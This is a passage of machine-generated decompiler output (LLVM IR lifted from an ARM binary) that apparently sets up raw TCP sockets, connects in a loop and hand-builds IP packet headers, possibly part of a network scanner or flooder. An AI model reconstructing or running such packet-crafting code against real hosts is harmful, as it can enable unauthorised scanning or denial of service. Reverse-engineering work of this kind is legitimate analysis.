  %v0_99b4 = load i32, i32* @r4, align 4
  store i32 %v0_99b4, i32* %r0.global-to-local, align 4
  %v5_99bc = inttoptr i32 %v0_99a8 to i32*
  %v6_99bc = call i32 @function_8570(i32 %v0_99b4, i32* %v5_99bc, i32 12, i32 1, i32 %v1_99a4)
  %v1_99c4 = urem i32 %v6_99bc, 256
  store i32 %v1_99c4, i32* %ip.global-to-local, align 4
  %v0_99c8 = load i32, i32* @r5, align 4
  store i32 %v0_99c8, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99d4 = load i32, i32* @r4, align 4
  store i32 %v0_99d4, i32* %r0.global-to-local, align 4
  %v5_99dc = inttoptr i32 %v0_99c8 to i32*
  %v6_99dc = call i32 @function_8570(i32 %v0_99d4, i32* %v5_99dc, i32 13, i32 1, i32 %v1_99c4)
  %v1_99e4 = urem i32 %v6_99dc, 256
  store i32 %v1_99e4, i32* %ip.global-to-local, align 4
  %v0_99e8 = load i32, i32* @r5, align 4
  store i32 %v0_99e8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_99f4 = load i32, i32* @r4, align 4
  store i32 %v0_99f4, i32* %r0.global-to-local, align 4
  %v5_99fc = inttoptr i32 %v0_99e8 to i32*
  %v6_99fc = call i32 @function_8570(i32 %v0_99f4, i32* %v5_99fc, i32 14, i32 1, i32 %v1_99e4)
  %v1_9a04 = urem i32 %v6_99fc, 256
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9a08 = load i32, i32* @r5, align 4
  store i32 %v0_9a08, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a14 = load i32, i32* @r4, align 4
  store i32 %v0_9a14, i32* %r0.global-to-local, align 4
  %v5_9a1c = inttoptr i32 %v0_9a08 to i32*
  %v6_9a1c = call i32 @function_8570(i32 %v0_9a14, i32* %v5_9a1c, i32 15, i32 1, i32 %v1_9a04)
  %v1_9a24 = urem i32 %v6_9a1c, 256
  store i32 %v1_9a24, i32* %ip.global-to-local, align 4
  %v0_9a28 = load i32, i32* @r5, align 4
  store i32 %v0_9a28, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a34 = load i32, i32* @r4, align 4
  store i32 %v0_9a34, i32* %r0.global-to-local, align 4
  %v5_9a3c = inttoptr i32 %v0_9a28 to i32*
  %v6_9a3c = call i32 @function_8570(i32 %v0_9a34, i32* %v5_9a3c, i32 16, i32 1, i32 %v1_9a24)
  %v1_9a44 = urem i32 %v6_9a3c, 256
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_9a50 = load i32, i32* @r5, align 4
  store i32 %v0_9a50, i32* %r1.global-to-local, align 4
  %v0_9a54 = load i32, i32* @r4, align 4
  store i32 %v0_9a54, i32* %r0.global-to-local, align 4
  %v5_9a5c = inttoptr i32 %v0_9a50 to i32*
  %v6_9a5c = call i32 @function_8570(i32 %v0_9a54, i32* %v5_9a5c, i32 0, i32 768, i32 %v1_9a44)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9a6c = load i32, i32* @r5, align 4
  store i32 %v0_9a6c, i32* %r1.global-to-local, align 4
  %v0_9a70 = load i32, i32* @r4, align 4
  store i32 %v0_9a70, i32* %r0.global-to-local, align 4
  %v5_9a74 = inttoptr i32 %v0_9a6c to i32*
  %v6_9a74 = call i32 @function_8570(i32 %v0_9a70, i32* %v5_9a74, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9a7c = urem i32 %v6_9a74, 256
  store i32 %v1_9a7c, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9a90 = call i32 @function_115f4(i32 2, i32 3, i32 6)
  store i32 %v3_9a90, i32* %r0.global-to-local, align 4
  %v7_9a94 = icmp eq i32 %v3_9a90, -1
  store i1 %v7_9a94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9a90, i32* @sb, align 4
  br i1 %v7_9a94, label %dec_label_pc_9c84, label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %dec_label_pc_98bc
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9aa8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9aa8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9abc = call i32 @function_115b0(i32 %v3_9a90, i32 0, i32 3, i32 %v6_9aa8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9abc, i32* %r0.global-to-local, align 4
  %v7_9ac0 = icmp eq i32 %v5_9abc, -1
  store i1 %v7_9ac0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9ac0, label %dec_label_pc_9c7c, label %dec_label_pc_9ac8

dec_label_pc_9ac8:                                ; preds = %dec_label_pc_9aa0
  %v0_9ac8 = load i32, i32* @r7, align 4
  %v3_9ac8 = mul i32 %v0_9ac8, 65536
  store i32 %v3_9ac8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_9ad0 = load i32, i32* @r6, align 4
  %v2_9ad0 = icmp eq i32 %v0_9ad0, 0
  store i1 %v2_9ad0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9ad8 = urem i32 %v0_9ac8, 65536
  store i32 %v3_9ad8, i32* @fp, align 4
  br i1 %v2_9ad0, label %dec_label_pc_9f08, label %dec_label_pc_9ae0.preheader

dec_label_pc_9ae0.preheader:                      ; preds = %dec_label_pc_9ac8
  %v2_9b2c = ptrtoint i32* %stack_var_-144 to i32
  %v2_9b70 = ptrtoint i32* %stack_var_-64 to i32
  %v2_9ba8 = ptrtoint i32* %stack_var_-80 to i32
  %v2_9bb4 = ptrtoint i32* %stack_var_-336 to i32
  %v2_9bb8 = ptrtoint i32* %stack_var_-48 to i32
  %v4_9c18 = zext i8 %tmp to i32
  %v1_9c1c = and i32 %v4_9c18, 18
  %v2_9c20 = icmp eq i32 %v1_9c1c, 18
  %v3_9c04 = sext i16 %tmp61 to i32
  %v1_9c28 = and i32 %v4_9c18, 5
  %v2_9c28 = icmp eq i32 %v1_9c28, 0
  %v4_9b68 = add i32 %v2_9b2c, 82
  %v5_9b68 = inttoptr i32 %v4_9b68 to i16*
  %v1_9d58 = add i32 %v6_9a5c, 40
  %v1_9e6c = urem i32 %v6_999c, 2
  %tmp97 = sub nsw i32 0, %v1_9e6c
  %v4_9e74 = and i32 %tmp97, 32
  %v1_9e84 = urem i32 %v6_99bc, 2
  %tmp98 = sub nsw i32 0, %v1_9e84
  %v4_9e8c = and i32 %tmp98, 16
  %v1_9e9c = urem i32 %v6_99dc, 2
  %tmp99 = sub nsw i32 0, %v1_9e9c
  %v4_9ea4 = and i32 %tmp99, 8
  %v1_9eb4 = urem i32 %v6_99fc, 2
  %tmp100 = sub nsw i32 0, %v1_9eb4
  %v4_9ebc = and i32 %tmp100, 4
  %v1_9ecc = urem i32 %v6_9a1c, 2
  %tmp101 = sub nsw i32 0, %v1_9ecc
  %v3_9ed4 = and i32 %tmp101, 2
  %v1_9ee4 = urem i32 %v6_9a3c, 2
  br label %dec_label_pc_9ae0

dec_label_pc_9ae0:                                ; preds = %dec_label_pc_9ae0.preheader, %dec_label_pc_9c54
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_9c54 ], [ %tmp34, %dec_label_pc_9ae0.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_9c54 ], [ %tmp37, %dec_label_pc_9ae0.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9aec = call i32 @function_115f4(i32 2, i32 1, i32 0)
  store i32 %v3_9aec, i32* %r0.global-to-local, align 4
  %v7_9af0 = icmp eq i32 %v3_9aec, -1
  store i1 %v7_9af0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9aec, i32* @r5, align 4
  br i1 %v7_9af0, label %dec_label_pc_9c54, label %dec_label_pc_9afc

dec_label_pc_9afc:                                ; preds = %dec_label_pc_9ae0, %dec_label_pc_9c30
  %v0_9b04 = phi i32 [ %v3_9c44, %dec_label_pc_9c30 ], [ %v3_9aec, %dec_label_pc_9ae0 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_9c30 ], [ %stack_var_-62.0, %dec_label_pc_9ae0 ]
  %stack_var_-60.1 = phi i32 [ %v0_9d04, %dec_label_pc_9c30 ], [ %stack_var_-60.0, %dec_label_pc_9ae0 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9b04 = call i32 @function_10c10(i32 %v0_9b04, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_9b0c = or i32 %v2_9b04, 2048
  store i32 %v1_9b0c, i32* %r2.global-to-local, align 4
  %v0_9b10 = load i32, i32* @r5, align 4
  store i32 %v0_9b10, i32* %r0.global-to-local, align 4
  %v2_9b14 = call i32 @function_10c10(i32 %v0_9b10, i32 4)
  %v3_9b18 = load i32, i32* %stack_var_-44, align 4
  %v5_9b20 = mul i32 %v3_9b18, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_9b2c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_9b34 = add i32 %v5_9b20, %arg2
  store i32 %v2_9b34, i32* %r3.global-to-local, align 4
  %v1_9b38 = add i32 %v2_9b34, 20
  %v2_9b38 = inttoptr i32 %v1_9b38 to i8*
  %v3_9b38 = load i8, i8* %v2_9b38, align 1
  %v4_9b38 = zext i8 %v3_9b38 to i32
  store i32 %v4_9b38, i32* %r2.global-to-local, align 4
  %v2_9b3c = icmp ugt i8 %v3_9b38, 30
  %v7_9b3c = icmp eq i8 %v3_9b38, 31
  store i1 %v7_9b3c, i1* %cpsr_z.global-to-local, align 1
  %v2_9b40 = xor i1 %v7_9b3c, true
  %v3_9b40 = and i1 %v2_9b3c, %v2_9b40
  br i1 %v3_9b40, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_9afc
  %v5_9b40 = add i32 %v2_9b34, 16
  %v6_9b40 = inttoptr i32 %v5_9b40 to i32*
  %v7_9b40 = load i32, i32* %v6_9b40, align 4
  store i32 %v7_9b40, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_9afc, %bb
  %v4_9b44 = phi i32 [ %v2_9b34, %dec_label_pc_9afc ], [ %v7_9b40, %bb ]
  %v4_9b44.stack_var_-60.1 = select i1 %v3_9b40, i32 %v4_9b44, i32 %stack_var_-60.1
  %v2_9b48 = xor i1 %v2_9b3c, true
  %v3_9b48 = or i1 %v7_9b3c, %v2_9b48
  br i1 %v3_9b48, label %dec_label_pc_9c90, label %dec_label_pc_9b4c

dec_label_pc_9b4c:                                ; preds = %bb71, %dec_label_pc_9c90
  %v0_9d04 = phi i32 [ %v5_9ce0, %dec_label_pc_9c90 ], [ %v4_9b44.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9b54 = load i32, i32* @sl, align 4
  %v9_9b54 = icmp eq i32 %v0_9b54, 65535
  store i1 %v9_9b54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9b54, label %dec_label_pc_9cec, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_9b4c
  %v4_9b58 = udiv i32 %v0_9b54, 256
  %v2_9b5c = urem i32 %v0_9b54, 256
  store i32 %v2_9b5c, i32* %r2.global-to-local, align 4
  %v5_9b60 = mul nuw nsw i32 %v2_9b5c, 256
  %v6_9b60 = or i32 %v5_9b60, %v4_9b58
  store i32 %v6_9b60, i32* %r3.global-to-local, align 4
  store i32 %v2_9b2c, i32* %r0.global-to-local, align 4
  %v2_9b68 = trunc i32 %v6_9b60 to i16
  store i16 %v2_9b68, i16* %v5_9b68, align 2
  br label %dec_label_pc_9b70

dec_label_pc_9b70:                                ; preds = %.thread9, %dec_label_pc_9cec
  %stack_var_-62.2 = phi i16 [ %v1_9cec, %dec_label_pc_9cec ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_9b70, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_9b78 = load i32, i32* @r5, align 4
  store i32 %v0_9b78, i32* %r0.global-to-local, align 4
  %v3_9b7c = call i32 @function_113dc(i32 %v0_9b78, i32 %v2_9b70, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9b84 = call i32 @function_10a5c(i32* null)
  store i32 %v2_9b84, i32* %r0.global-to-local, align 4
  store i32 %v2_9b84, i32* @r4, align 4
  %v9_9be4 = icmp eq i32 %tmp35, %v0_9d04
  %v4_9c0c = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_9be4 to i32
  %v9_9bf8 = icmp eq i1 %v9_9be4, false
  %v9_9c10 = icmp eq i32 %v3_9c04, %v4_9c0c
  br label %dec_label_pc_9ba0

dec_label_pc_9b90:                                ; preds = %.thread, %dec_label_pc_9c00, %dec_label_pc_9c28, %bb75
  %v2_9b90 = call i32 @function_10a5c(i32* null)
  %v0_9b94 = load i32, i32* @r4, align 4
  %v2_9b94 = sub i32 %v2_9b90, %v0_9b94
  store i32 %v2_9b94, i32* %r0.global-to-local, align 4
  %v7_9b98 = icmp eq i32 %v2_9b94, 10
  store i1 %v7_9b98, i1* %cpsr_z.global-to-local, align 1
  %v8_9b9c = icmp sgt i32 %v2_9b94, 10
  br i1 %v8_9b9c, label %dec_label_pc_9c30, label %dec_label_pc_9ba0

dec_label_pc_9ba0:                                ; preds = %dec_label_pc_9b90, %dec_label_pc_9b70
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_9bb4, i32* %r1.global-to-local, align 4
  store i32 %v2_9bb8, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9bc0 = load i32, i32* @sb, align 4
  store i32 %v0_9bc0, i32* %r0.global-to-local, align 4
  %v6_9bc8 = call i32 @function_114fc(i32 %v0_9bc0, i32 %v2_9bb4, i32 256, i32 16384, i32 %v2_9ba8, i32 %v2_9bb8)
  store i32 %v6_9bc8, i32* %r2.global-to-local, align 4
  %v7_9bd0 = icmp eq i32 %v6_9bc8, -1
  store i1 %v7_9bd0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_9bd0, label %dec_label_pc_9c84, label %dec_label_pc_9bdc

dec_label_pc_9bdc:                                ; preds = %dec_label_pc_9ba0
  store i32 %v0_9d04, i32* %r1.global-to-local, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_9bf0 = icmp eq i32 %v6_9bc8, 40
  store i1 %v7_9bf0, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_9bc8, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_9bdc
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_9b90

bb75:                                             ; preds = %dec_label_pc_9bdc
  store i1 %v9_9bf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9bf8, label %dec_label_pc_9b90, label %dec_label_pc_9c00

dec_label_pc_9c00:                                ; preds = %bb75
  store i32 %v3_9c04, i32* @lr, align 4
  store i32 %v2_9b2c, i32* @r3, align 4
  store i32 %v4_9c0c, i32* %r2.global-to-local, align 4
  store i1 %v9_9c10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9c10, label %dec_label_pc_9c18, label %dec_label_pc_9b90

dec_label_pc_9c18:                                ; preds = %dec_label_pc_9c00
  store i32 %v4_9c18, i32* %r2.global-to-local, align 4
  store i32 %v1_9c1c, i32* @r3, align 4
  store i1 %v2_9c20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c20, label %dec_label_pc_9cfc, label %dec_label_pc_9c28

dec_label_pc_9c28:                                ; preds = %dec_label_pc_9c18
  store i1 %v2_9c28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c28, label %dec_label_pc_9b90, label %dec_label_pc_9c30

dec_label_pc_9c30:                                ; preds = %dec_label_pc_9c28, %dec_label_pc_9b90
  %v0_9c30 = load i32, i32* @r5, align 4
  store i32 %v0_9c30, i32* %r0.global-to-local, align 4
  %v1_9c34 = call i32 @function_10ddc(i32 %v0_9c30)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9c44 = call i32 @function_115f4(i32 2, i32 1, i32 0)
  store i32 %v3_9c44, i32* %r0.global-to-local, align 4
  %v3_9c48 = icmp eq i32 %v3_9c44, -1
  %v8_9c48 = icmp eq i32 %v3_9c44, -1
  store i1 %v8_9c48, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9c44, i32* @r5, align 4
  br i1 %v3_9c48, label %dec_label_pc_9c54, label %dec_label_pc_9afc

dec_label_pc_9c54:                                ; preds = %dec_label_pc_9c30, %dec_label_pc_9ae0, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_9ae0 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_9c30 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_9ae0 ], [ %v0_9d04, %bb82 ], [ %v0_9d04, %dec_label_pc_9c30 ]
  %v3_9c54 = load i32, i32* %stack_var_-44, align 4
  %v1_9c58 = add i32 %v3_9c54, 1
  store i32 %v1_9c58, i32* @r3, align 4
  %v1_9c5c = load i32, i32* @r6, align 4
  %v9_9c5c = icmp eq i32 %v1_9c58, %v1_9c5c
  store i1 %v9_9c5c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9c58, i32* %stack_var_-44, align 4
  %v5_9c64 = icmp slt i32 %v1_9c58, %v1_9c5c
  br i1 %v5_9c64, label %dec_label_pc_9ae0, label %dec_label_pc_9c68

dec_label_pc_9c68:                                ; preds = %dec_label_pc_9c54
  store i32 %v6_9a5c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f18

dec_label_pc_9c7c:                                ; preds = %dec_label_pc_9aa0
  %v0_9c7c = load i32, i32* @sb, align 4
  store i32 %v0_9c7c, i32* %r0.global-to-local, align 4
  %v1_9c80 = call i32 @function_10ddc(i32 %v0_9c7c)
  store i32 %v1_9c80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9c84

dec_label_pc_9c84:                                ; preds = %dec_label_pc_9ba0, %dec_label_pc_98bc, %dec_label_pc_9c7c
  %v1_9c8c = phi i32 [ %v3_9a90, %dec_label_pc_98bc ], [ %v1_9c80, %dec_label_pc_9c7c ], [ 0, %dec_label_pc_9ba0 ]
  store i32 %v27_98bc, i32* %lr.global-to-local, align 4
  ret i32 %v1_9c8c

dec_label_pc_9c90:                                ; preds = %bb71
  %v1_9c90 = add i32 %v4_9b44, 16
  %v2_9c90 = inttoptr i32 %v1_9c90 to i32*
  %v3_9c90 = load i32, i32* %v2_9c90, align 4
  store i32 %v3_9c90, i32* @r4, align 4
  %v0_9c94 = call i32 @function_e0b8()
  store i32 %v0_9c94, i32* %r0.global-to-local, align 4
  %v3_9c98 = load i32, i32* %stack_var_-44, align 4
  %v5_9ca0 = mul i32 %v3_9c98, 24
  %v0_9ca8 = load i32, i32* @r4, align 4
  %v1_9ca8 = and i32 %v0_9ca8, 16711680
  store i32 %v1_9ca8, i32* %ip.global-to-local, align 4
  %v3_9cac = udiv i32 %v0_9ca8, 16777216
  %v2_9cb0 = add i32 %v5_9ca0, %arg2
  store i32 %v2_9cb0, i32* %r1.global-to-local, align 4
  %v4_9cb4 = udiv i32 %v1_9ca8, 256
  %v5_9cb4 = or i32 %v4_9cb4, %v3_9cac
  store i32 %v5_9cb4, i32* %r2.global-to-local, align 4
  %v1_9cb8 = and i32 %v0_9ca8, 65280
  store i32 %v1_9cb8, i32* %r3.global-to-local, align 4
  %v1_9cbc = add i32 %v2_9cb0, 20
  %v2_9cbc = inttoptr i32 %v1_9cbc to i8*
  %v3_9cbc = load i8, i8* %v2_9cbc, align 1
  %v4_9cbc = zext i8 %v3_9cbc to i32
  store i32 %v4_9cbc, i32* %ip.global-to-local, align 4
  %v5_9cc4 = call i32 @llvm.bswap.i32(i32 %v0_9ca8)
  %v7_9cc8 = lshr i32 %v0_9c94, %v4_9cbc
  %v8_9cc8 = add i32 %v7_9cc8, %v5_9cc4
  store i32 %v8_9cc8, i32* %r2.global-to-local, align 4
  %v1_9ccc = and i32 %v8_9cc8, 16711680
  store i32 %v1_9ccc, i32* %r0.global-to-local, align 4
  %v1_9cd8 = and i32 %v8_9cc8, 65280
  store i32 %v1_9cd8, i32* %r1.global-to-local, align 4
  %v5_9ce0 = call i32 @llvm.bswap.i32(i32 %v8_9cc8)
  store i32 %v5_9ce0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9b4c

dec_label_pc_9cec:                                ; preds = %dec_label_pc_9b4c
  %v0_9cec = call i32 @function_e0b8()
  %v1_9cec = trunc i32 %v0_9cec to i16
  store i32 %v0_9cec, i32* %r0.global-to-local, align 4
  store i32 %v2_9b2c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9b70

dec_label_pc_9cfc:                                ; preds = %dec_label_pc_9c18
  %v3_9cfc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9cfc, i32* @r4, align 4
  store i32 %v2_98d8, i32* %ip.global-to-local, align 4
  %v5_9d04 = mul i32 %v3_9cfc, 16
  %v6_9d04 = add i32 %v5_9d04, %v2_98d8
  %v7_9d04 = inttoptr i32 %v6_9d04 to i32*
  store i32 %v0_9d04, i32* %v7_9d04, align 4
  %v0_9d08 = load i32, i32* @r8, align 4
  %v1_9d08 = add i32 %v0_9d08, 4
  %v2_9d08 = inttoptr i32 %v1_9d08 to i32*
  %v3_9d08 = load i32, i32* %v2_9d08, align 4
  store i32 %v3_9d08, i32* %r1.global-to-local, align 4
  %v1_9d14 = and i32 %v3_9d08, 65280
  store i32 %v1_9d14, i32* %r2.global-to-local, align 4
  store i32 %v2_98d8, i32* %r0.global-to-local, align 4
  %v0_9d24 = load i32, i32* @r4, align 4
  %v3_9d24 = mul i32 %v0_9d24, 16
  %v2_9d28 = add i32 %v3_9d24, %v2_98d8
  store i32 %v2_9d28, i32* %ip.global-to-local, align 4
  %v5_9d2c = call i32 @llvm.bswap.i32(i32 %v3_9d08)
  store i32 %v5_9d2c, i32* %r3.global-to-local, align 4
  %v2_9d30 = add i32 %v2_9d28, 4
  %v3_9d30 = inttoptr i32 %v2_9d30 to i32*
  store i32 %v5_9d2c, i32* %v3_9d30, align 4
  %v0_9d34 = load i32, i32* @r8, align 4
  %v1_9d34 = add i32 %v0_9d34, 8
  %v2_9d34 = inttoptr i32 %v1_9d34 to i32*
  %v3_9d34 = load i32, i32* %v2_9d34, align 4
  store i32 %v3_9d34, i32* %r1.global-to-local, align 4
  %v1_9d38 = and i32 %v3_9d34, 16711680
  store i32 %v1_9d38, i32* %r0.global-to-local, align 4
  store i32 %v6_9a5c, i32* %r2.global-to-local, align 4
  %v5_9d50 = call i32 @llvm.bswap.i32(i32 %v3_9d34)
  store i32 %v5_9d50, i32* %r3.global-to-local, align 4
  %v1_9d54 = add i32 %v0_9d34, 2
  %v2_9d54 = inttoptr i32 %v1_9d54 to i16*
  %v3_9d54 = load i16, i16* %v2_9d54, align 2
  %v4_9d54 = zext i16 %v3_9d54 to i32
  store i32 %v4_9d54, i32* %r1.global-to-local, align 4
  store i32 %v1_9d58, i32* @r7, align 4
  %v0_9d5c = load i32, i32* @lr, align 4
  %v1_9d5c = trunc i32 %v0_9d5c to i16
  %v2_9d5c = load i32, i32* %ip.global-to-local, align 4
  %v3_9d5c = add i32 %v2_9d5c, 14
  %v4_9d5c = inttoptr i32 %v3_9d5c to i16*
  store i16 %v1_9d5c, i16* %v4_9d5c, align 2
  %v0_9d60 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d60 = trunc i32 %v0_9d60 to i16
  %v2_9d60 = load i32, i32* %ip.global-to-local, align 4
  %v3_9d60 = add i32 %v2_9d60, 12
  %v4_9d60 = inttoptr i32 %v3_9d60 to i16*
  store i16 %v1_9d60, i16* %v4_9d60, align 2
  %v0_9d64 = load i32, i32* %r3.global-to-local, align 4
  %v1_9d64 = load i32, i32* %ip.global-to-local, align 4
  %v2_9d64 = add i32 %v1_9d64, 8
  %v3_9d64 = inttoptr i32 %v2_9d64 to i32*
  store i32 %v0_9d64, i32* %v3_9d64, align 4
  %v0_9d68 = load i32, i32* @r7, align 4
  store i32 %v0_9d68, i32* @r0, align 4
  %v0_9d6c = call i32 @function_1183c()
  store i32 %v0_9d6c, i32* %r0.global-to-local, align 4
  store i32 %v2_98e8, i32* %r3.global-to-local, align 4
  %v2_9d78 = load i32, i32* @r4, align 4
  %v5_9d78 = mul i32 %v2_9d78, 4
  %v6_9d78 = add i32 %v5_9d78, %v2_98e8
  %v7_9d78 = inttoptr i32 %v6_9d78 to i32*
  store i32 %v0_9d6c, i32* %v7_9d78, align 4
  %v3_9d7c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9d7c, i32* %r2.global-to-local, align 4
  %v0_9d80 = load i32, i32* %r3.global-to-local, align 4
  %v4_9d80 = mul i32 %v3_9d7c, 4
  %v5_9d80 = add i32 %v0_9d80, %v4_9d80
  %v6_9d80 = inttoptr i32 %v5_9d80 to i32*
  %v7_9d80 = load i32, i32* %v6_9d80, align 4
  store i32 %v7_9d80, i32* @r4, align 4
  %v1_9d84 = inttoptr i32 %v7_9d80 to i8*
  %v2_9d84 = load i8, i8* %v1_9d84, align 1
  %tmp103 = urem i8 %v2_9d84, 16
  %v1_9d88 = zext i8 %tmp103 to i32
  %v1_9d8c = or i32 %v1_9d88, 64
  store i32 %v1_9d8c, i32* %r3.global-to-local, align 4
  %v1_9d90 = trunc i32 %v1_9d8c to i8
  store i8 %v1_9d90, i8* %v1_9d84, align 1
  %v0_9d94 = load i32, i32* @r4, align 4
  %v1_9d94 = inttoptr i32 %v0_9d94 to i8*
  %v2_9d94 = load i8, i8* %v1_9d94, align 1
  %v0_9d98 = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_9d98, 256
  %v1_9da0 = and i8 %v2_9d94, -16
  %v1_9da4 = or i8 %v1_9da0, 5
  %v1_9da8 = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_9d98, 256
  %v4_9dac = urem i32 %tmp78, 256
  %v5_9dac = or i32 %v4_9dac, %v1_9da8
  store i32 %v5_9dac, i32* %r2.global-to-local, align 4
  %v0_9db0 = load i32, i32* @fp, align 4
  %v1_9db0 = urem i32 %v0_9db0, 256
  store i32 %v1_9db0, i32* %r0.global-to-local, align 4
  store i32 %v1_9968, i32* %ip.global-to-local, align 4
  %v3_9db8 = udiv i32 %v0_9db0, 256
  store i32 %v3_9db8, i32* %r1.global-to-local, align 4
  store i8 %v1_9da4, i8* %v1_9d94, align 1
  %v0_9dc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_9dc0 = load i32, i32* %r0.global-to-local, align 4
  %v4_9dc0 = mul i32 %v1_9dc0, 256
  %v5_9dc0 = or i32 %v4_9dc0, %v0_9dc0
  store i32 %v5_9dc0, i32* %r1.global-to-local, align 4
  store i32 %v6_9900, i32* %r0.global-to-local, align 4
  %v2_9dc8 = load i32, i32* @r4, align 4
  %v3_9dc8 = add i32 %v2_9dc8, 1
  %v4_9dc8 = inttoptr i32 %v3_9dc8 to i8*
  store i8 %v5_9920, i8* %v4_9dc8, align 1
  %v0_9dcc = load i32, i32* %r1.global-to-local, align 4
  %v1_9dcc = trunc i32 %v0_9dcc to i16
  %v2_9dcc = load i32, i32* @r4, align 4
  %v3_9dcc = add i32 %v2_9dcc, 4
  %v4_9dcc = inttoptr i32 %v3_9dcc to i16*
  store i16 %v1_9dcc, i16* %v4_9dcc, align 2
  %v0_9dd0 = load i32, i32* %ip.global-to-local, align 4
  %v2_9dd0 = icmp eq i32 %v0_9dd0, 0
  store i1 %v2_9dd0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_995c, i32* %r1.global-to-local, align 4
  %v0_9dd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_9dd8 = trunc i32 %v0_9dd8 to i16
  %v2_9dd8 = load i32, i32* @r4, align 4
  %v3_9dd8 = add i32 %v2_9dd8, 2
  %v4_9dd8 = inttoptr i32 %v3_9dd8 to i16*
  store i16 %v1_9dd8, i16* %v4_9dd8, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_9dd0, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_9cfc
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

